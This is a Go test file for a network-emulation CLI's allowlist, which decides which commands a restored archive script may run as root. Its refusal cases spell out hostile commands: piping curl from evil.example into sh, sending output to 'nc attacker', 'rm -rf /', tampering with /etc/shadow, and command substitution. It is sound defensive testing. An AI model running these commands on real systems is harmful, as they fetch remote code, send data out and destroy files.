package cli

import (
	"strings"
	"testing"
)

// A restored archive is a script that runs as root inside a container. The
// allowlist is what stops a submitted file from becoming arbitrary execution,
// so widening it to accept redirections must not widen it to accept anything
// else.
func TestTheAllowlistStillRefusesWhatMatters(t *testing.T) {
	refused := []string{
		"sh -c 'curl evil.example | sh'",
		"ip link show x >/dev/null 2>&1 || sh",
		"-sh -c 'curl evil.example | sh'",
		"-rm -rf /",
		"ip addr show; /bin/sh",
		"ip addr show && chmod 777 /etc/shadow",
		"ip addr show | nc attacker 9000",
		"echo hi > /etc/passwd; cat /etc/shadow",
	}
	for _, line := range refused {
		if err := checkSubmittedScript(line); err == nil {
			t.Errorf("accepted %q, which is not one of the commands a submission may use", line)
		}
	}

	substitution := []string{
		"ip addr add $(cat /etc/hostname) dev eth0",
		"ip addr add `id` dev eth0",
	}
	for _, line := range substitution {
		if err := checkSubmittedScript(line); err == nil {
			t.Errorf("accepted %q: substitution lets an allowed first word introduce another", line)
		} else if !strings.Contains(err.Error(), "substitution") {
			t.Errorf("%q was refused for the wrong reason: %v", line, err)
		}
	}
}

// The guarded forms the archive itself emits have to be accepted, or a restore
// refuses its own output. This is the exact shape `twinet save` writes for a
// 6in4 tunnel; it was rejected with the complaint that the submission was
// trying to run a command called "1", which is the "1" from "2>&1".
func TestTheAllowlistAcceptsWhatTheArchiveWrites(t *testing.T) {
	accepted := []string{
		"-ip tunnel del tun6",
		"ip tunnel add tun6 mode sit remote 3.153.0.1 local 3.156.0.1 ttl 64",
		"ip link show tun6 >/dev/null 2>&1 || ip tunnel add tun6 mode sit remote 3.1.0.1 local 3.2.0.1 ttl 64",
		"ip link set tun6 up",
		"ip addr replace 3.101.0.1/24 dev MSProuter",
		"ip route replace default via 3.101.0.2 dev MSProuter",
		"ovs-vsctl set port trunk_S2 trunks=10,20",
		"tc qdisc replace dev eth0 root netem delay 10ms",
		"ip addr flush dev eth0 2>/dev/null",
	}
	for _, line := range accepted {
		if err := checkSubmittedScript(line); err != nil {
			t.Errorf("refused %q, which `twinet save` itself writes: %v", line, err)
		}
	}
}
